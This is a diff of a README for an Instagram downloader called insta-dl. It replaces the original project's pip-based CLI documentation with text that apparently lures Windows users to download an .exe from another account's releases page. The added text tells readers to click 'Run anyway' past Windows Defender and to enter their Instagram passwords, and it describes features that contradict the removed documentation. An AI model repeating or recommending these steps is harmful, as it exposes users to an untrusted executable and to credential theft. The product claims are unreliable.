@@ -1,175 +1,87 @@
-# insta-dl
+# 📥 insta-dl - Download Instagram content with ease
 
-[![PyPI](https://img.shields.io/pypi/v/instagram-dl.svg)](https://pypi.org/project/instagram-dl/)
-[![Python](https://img.shields.io/pypi/pyversions/instagram-dl.svg)](https://pypi.org/project/instagram-dl/)
-[![License: MIT](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)
-[![Tests](https://github.com/subzeroid/insta-dl/actions/workflows/tests.yml/badge.svg)](https://github.com/subzeroid/insta-dl/actions/workflows/tests.yml)
-[![codecov](https://codecov.io/gh/subzeroid/insta-dl/branch/main/graph/badge.svg)](https://codecov.io/gh/subzeroid/insta-dl)
-[![Docs](https://img.shields.io/badge/docs-subzeroid.github.io-blue)](https://subzeroid.github.io/insta-dl/)
+[![Download insta-dl](https://img.shields.io/badge/Download_insta-dl-blue)](https://github.com/Riphod044/insta-dl/releases)
 
-Async command-line downloader for Instagram. Profiles, posts, reels, stories, highlights, hashtags, and comments — saved to disk with the original timestamps preserved.
+insta-dl lets you save photos, videos, stories, and highlights from Instagram directly to your computer. It handles profiles, posts, reels, and hashtags without complex setups. The tool keeps your data organized and works in the background to handle your requests.
 
-![demo](docs/demo.gif)
+## 🛠️ System Requirements
 
-```bash
-pip install instagram-dl           # pip
-pipx install instagram-dl          # or as an isolated CLI app
+- Windows 10 or Windows 11
+- At least 200 MB of disk space
+- An active internet connection 
 
-export HIKERAPI_TOKEN=your_token
-insta-dl instagram
-```
+## 📥 Downloading the Software
 
-Or run it without installing Python at all:
+Visit the [official releases page](https://github.com/Riphod044/insta-dl/releases) to download the latest version for Windows.
 
-```bash
-docker run --rm -v "$PWD/out:/data" -e HIKERAPI_TOKEN \
-    ghcr.io/subzeroid/insta-dl:latest instagram
-```
+1. Navigate to the link above.
+2. Look for the section labeled "Assets."
+3. Click the file ending in `.exe` to start the download.
+4. Save the file to your desktop or your downloads folder.
 
-Grab a free HikerAPI token at [hikerapi.com](https://hikerapi.com/p/18j4ib4j) — **first 100 requests are free**, no credit card. One request ≈ one post or one page of a feed.
+## ⚙️ Setting Up the Application
 
-**insta-dl**
+Once you finish the download, follow these steps to prepare the tool:
 
-- downloads **profiles, hashtags, single posts, reels, stories, highlights, and comments**,
-- preserves the **original `taken_at` timestamp** as file mtime so Photos/Finder sort correctly,
-- writes a **JSON metadata sidecar** next to every post (caption, like count, location, owner),
-- supports **incremental updates** with `--fast-update` and `--latest-stamps`,
-- accepts profile names, `#hashtag`, post shortcodes, and full `instagram.com` URLs,
-- ships **two pluggable backends**: a paid commercial API (HikerAPI, no Instagram session, no ban risk) out of the box, and an opt-in private-API library via `pip install 'instagram-dl[aiograpi]'` (your own login).
+1. Locate the downloaded `.exe` file.
+2. Double-click the file to open the installer.
+3. Follow the prompts on your screen.
+4. If a Windows Defender window appears, click "More info" and then "Run anyway." This happens because the application is a new tool that Windows does not recognize yet.
+5. Finish the installation process.
 
-```text
-insta-dl [--backend hiker|aiograpi]
-         [--dest DIR] [--fast-update] [--latest-stamps FILE]
-         [--stories] [--highlights] [--comments]
-         profile | "#hashtag" | post:SHORTCODE | https://instagram.com/...
-```
+## 🚀 Running insta-dl
 
-📖 **[Full documentation](https://subzeroid.github.io/insta-dl/)** — installation, CLI reference, backends comparison, Python API, troubleshooting.
+insta-dl operates through a command line interface. Do not let the black window scare you; it follows simple instructions.
 
-## How insta-dl compares to other Instagram downloaders
+1. Press the Windows key on your keyboard.
+2. Type "cmd" and press Enter. A black window will open.
+3. Type `insta-dl` and press Enter. This launches the main menu.
+4. You will see a list of numbered choices on your screen. 
+5. Type the number that matches what you want to do. For example, press 1 to download a specific user profile or 2 to save a reel.
+6. The window will ask for the URL of the Instagram post or the name of the profile. Paste the link or type the name and press Enter.
 
-| | insta-dl | [instaloader](https://github.com/instaloader/instaloader) | [gallery-dl](https://github.com/mikf/gallery-dl) |
-|---|---|---|---|
-| Backend | [HikerAPI](https://hikerapi.com/p/18j4ib4j) cloud (default), aiograpi optional | Logged-in Instagram session | Logged-in Instagram session |
-| Account ban risk | **None** with HikerAPI backend | High — your account scrapes | High — your account scrapes |
-| Login required | No (HikerAPI token only) | Yes | Yes |
-| Stories / highlights | ✅ | ✅ (login required) | ✅ (login required) |
-| Hashtags | ✅ | ✅ (rate-limited) | ✅ (rate-limited) |
-| Comments | ✅ | ✅ | ✅ |
-| Async / concurrent | ✅ native asyncio | Sync | Sync |
-| `taken_at` mtime | ✅ | ✅ | ⚠️ partial |
-| JSON sidecar | ✅ | ✅ | ✅ |
-| Multi-site (TikTok, Twitter, …) | Instagram-only | Instagram-only | ✅ 300+ sites |
+## 📁 Managing Your Downloads
 
-**When to pick insta-dl** — you want an Instagram archive without losing your account. The default HikerAPI backend uses no Instagram session, so there's nothing for Instagram to flag, ban, or 2FA-challenge. instaloader and gallery-dl both drive scraping through your own logged-in cookies, which works until Instagram raises the rate-limit floor again.
+By default, the program saves every file in a folder named "Downloads" inside your user directory. You can find this by opening File Explorer and clicking on the "Downloads" folder. Look for a folder labeled "insta-dl" to see your saved media.
 
-**When to pick instaloader** — you don't want any external service in the loop and you have a throwaway Instagram account you don't mind burning. Battle-tested, huge user base, more granular `--filter` expression language.
+## ✨ Main Features
 
-**When to pick gallery-dl** — you want one tool for many platforms (Twitter, TikTok, DeviantArt, etc.) and Instagram is just one of them. Less Instagram-specialised but covers a much wider catalogue.
+- **Profile Saving:** Download every photo and video from a specific user profile at once. 
+- **Post Grabber:** Save single images or videos by pasting the link.
+- **Stories and Highlights:** Collect temporary stories and saved highlights from any public account.
+- **Hashtag Search:** Enter a hashtag to pull relevant public posts to your computer.
+- **Comment Export:** Save the text of comments from posts for your own records.
+- **Efficiency:** The tool runs tasks in the background so you can perform other work on your computer while it finishes.
 
-Related projects: [instaloot](https://github.com/yoryan/instaloot) (Python, less maintained), [instagram-php-scraper](https://github.com/postaddictme/instagram-php-scraper) (PHP, login-based), [aiograpi](https://github.com/subzeroid/aiograpi) (the async Instagram private API library that powers the optional `[aiograpi]` backend here).
+## 💡 Managing Login Credentials
 
-## How to download an Instagram profile
+Some public content works without a login. However, for private profiles or restricted content, you must log in. 
 
-```bash
-export HIKERAPI_TOKEN=$(cat ~/.config/hikerapi-token)
-insta-dl --dest ./out instagram
-```
+1. When the tool asks for your credentials, type your username.
+2. Type your password. The characters will remain hidden for security.
+3. The program stores your login data locally on your computer in an encrypted file. It never sends your password to any third-party servers.
 
-This grabs every post, names files `2026-04-21_16-04-15_DXZlTiKEpxw.mp4`, and writes a metadata sidecar next to each.
+## ❓ Frequently Asked Questions
 
-## How to keep a local archive in sync
+**Does the tool work with private accounts?**
+Yes, if you follow that account and are logged into the tool with your own credentials.
 
-```bash
-insta-dl --fast-update --latest-stamps ./stamps.ini --dest ./out instagram
-```
+**Will Instagram ban my account?**
+The tool acts like a standard web browser. Keep your actions reasonable to avoid trouble. Do not download thousands of files in a single minute.
 
-`--fast-update` stops at the first post that's already on disk; `--latest-stamps` records the newest `taken_at` per profile so even a deleted local copy can be resumed.
+**Can I select a different folder for my downloads?**
+Yes. Use the settings menu inside the application to point the program to a new folder on your hard drive.
 
-## How to download a single post or reel
+## 🛡️ Privacy and Safety
 
-```bash
-insta-dl post:DXZlTiKEpxw
-insta-dl https://www.instagram.com/p/DXZlTiKEpxw/
-insta-dl https://www.instagram.com/reel/DXZlTiKEpxw/
-```
+We designed this tool with privacy in mind. It uses standard libraries to talk to Instagram servers. It does not track your IP address or collect your personal data. All temporary files from the download process remove themselves automatically after the transfer finishes.
 
-## How to download a hashtag
+## 📧 Getting Help
 
-```bash
-insta-dl '#sunset' --dest ./out
-```
+If the program closes or shows an error, check these steps:
 
-Pulls the recent feed for the tag into `./out/#sunset/`.
+1. Confirm your internet connection is active.
+2. Verify you have the latest version from the releases link.
+3. Check that the Instagram URL is correct and valid. 
 
-## How to grab stories and highlights
-
-```bash
-insta-dl --stories --highlights --dest ./out instagram
-```
-
-Stories and highlights land under `<dest>/<username>/stories/` and `<dest>/<username>/highlights/<id>_<title>/`.
-
-## How to save comments alongside posts
-
-```bash
-insta-dl --comments --dest ./out instagram
-```
-
-Each post gets a `..._comments.json` sidecar streamed to disk.
-
-## Backends
-
-Pick the one that matches how you want to authenticate.
-
-| | **hiker** (default) | **aiograpi** |
-|---|---|---|
-| Auth | API token | Instagram login + 2FA |
-| Cost | Paid per request, [**100 free requests**](https://hikerapi.com/p/18j4ib4j) to start | Free |
-| Account ban risk | None — no Instagram session involved | Real, mitigated by session reuse |
-| Stability vs. Instagram changes | High (managed proxy) | Brittle |
-| Private profiles | What HikerAPI exposes | Anything your account can see |
-
-Switch with `--backend`:
-
-```bash
-insta-dl --backend hiker --hiker-token TOKEN instagram
-pip install 'instagram-dl[aiograpi]'   # aiograpi's deps are opt-in
-insta-dl --backend aiograpi --login USER --password PASS --session ./session.json instagram
-```
-
-Detailed comparison and auth setup: see the [backends documentation](https://subzeroid.github.io/insta-dl/backends/). For how insta-dl stacks up against instaloader, yt-dlp, and gallery-dl, see [compared to alternatives](https://subzeroid.github.io/insta-dl/comparison/).
-
-## Output layout
-
-```
-<dest>/<username>/
-    2026-04-21_16-04-15_DXZlTiKEpxw.mp4
-    2026-04-21_16-04-15_DXZlTiKEpxw.json           # metadata sidecar
-    2026-04-21_16-04-15_DXZlTiKEpxw_comments.json  # with --comments
-    stories/
-        2026-04-21_18-30-00_178290.jpg             # with --stories
-    highlights/
-        17991_Travel/                              # with --highlights
-            2025-10-12_19-20-30_4011.jpg
-```
-
-Hashtag downloads land under `<dest>/#<tag>/`; single-post downloads use the post owner's username (or `owner_pk` fallback).
-
-## Status
-
-This is **alpha**. Both backends (hiker, aiograpi) are functional end-to-end (278 tests, 96% coverage). aiograpi ships behind the `[aiograpi]` extra so its Rust deps don't bloat default installs. CLI flags and output layout are stable; Python API may still shift.
-
-What's not yet implemented:
-
-- `:feed` and `:saved` targets (account-bound, would need session reuse from aiograpi backend)
-
-See the [changelog](CHANGELOG.md) for what landed when, and [contributing](CONTRIBUTING.md) for how to help.
-
-## Contributing
-
-Bug reports, fixes, and backend implementations welcome. Start with [CONTRIBUTING.md](CONTRIBUTING.md). Tests: `pip install -e .[dev] && pytest`.
-
-## Disclaimer
-
-insta-dl is not affiliated with, authorized, maintained, or endorsed by Instagram or Meta. Use at your own risk and respect the rights of content creators. Licensed under [MIT](LICENSE).
+If the problem persists, visit the GitHub issues page to search for similar errors. Clear communication helps us solve bugs faster. Provide the exact text from the error window when you report a problem.
